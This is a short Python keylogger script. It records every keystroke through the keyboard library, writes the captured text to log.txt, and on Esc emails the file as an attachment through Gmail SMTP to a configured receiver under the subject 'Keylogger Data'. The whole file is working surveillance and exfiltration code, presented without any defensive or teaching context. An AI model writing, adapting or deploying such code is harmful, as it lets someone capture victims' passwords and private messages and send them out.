import keyboard
import time
import os
import sys
import smtplib
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from email.mime.application import MIMEApplication

recorded_text = ""

EMAIL_SENDER = "sender"
EMAIL_PASSWORD = "password_for_apps"
EMAIL_RECEIVER = "receiver"

special_keys = ['shift', 'alt', 'ctrl', 'left shift', 'right shift', 'left alt', 'right alt',
                'left ctrl', 'right ctrl', 'caps lock', 'alt gr', 'windows', 'left windows', 'right windows']

def send_email(file_path):
    try:
        msg = MIMEMultipart()
        msg['From'] = EMAIL_SENDER
        msg['To'] = EMAIL_RECEIVER
        msg['Subject'] = "Keylogger Data"

        body = "Attached are the data recorded by the keylogger."
        msg.attach(MIMEText(body, 'plain'))

        with open(file_path, 'rb') as f:
            attachment = MIMEApplication(f.read())
            attachment.add_header('Content-Disposition', 'attachment', filename='log.txt')
            msg.attach(attachment)

        server = smtplib.SMTP('smtp.gmail.com', 587)
        server.starttls()
        server.login(EMAIL_SENDER, EMAIL_PASSWORD)
        server.send_message(msg)
        server.quit()

        print("Email sent successfully!")
    except Exception as e:
        print(f"Error sending email: {str(e)}")
        print("Make sure you have entered the correct password for Gmail apps")

def on_key_press(key):
    global recorded_text

    if hasattr(key, 'name'):
        if key.name in special_keys:
            return

        if key.name == 'esc':
            file_path = save_to_file()
            if file_path:
                send_email(file_path)
            print("\nProgram terminated.")
            sys.exit()
        elif key.name == 'backspace':
            recorded_text = recorded_text[:-1]
            print("\b \b", end="", flush=True)
        elif key.name == 'space':
            recorded_text += " "
            print(" ", end="", flush=True)
        elif key.name == 'enter':
            recorded_text += "\n"
            print("\n", end="", flush=True)
        else:
            recorded_text += key.name
            print(f"{key.name}", end="", flush=True)
    else:
        recorded_text += str(key)
        print(f"{key}", end="", flush=True)

def save_to_file():
    try:
        file_path = os.path.join(os.path.dirname(os.path.abspath(__file__)), "log.txt")

        with open(file_path, "w", encoding="utf-8") as file:
            file.write(recorded_text)
        print(f"\nText saved to file: {file_path}")
        return file_path
    except Exception as e:
        print(f"\nError saving file: {str(e)}")
        return None

keyboard.on_press(on_key_press)

print("Start typing (press ESC to terminate and save)...")
keyboard.wait()
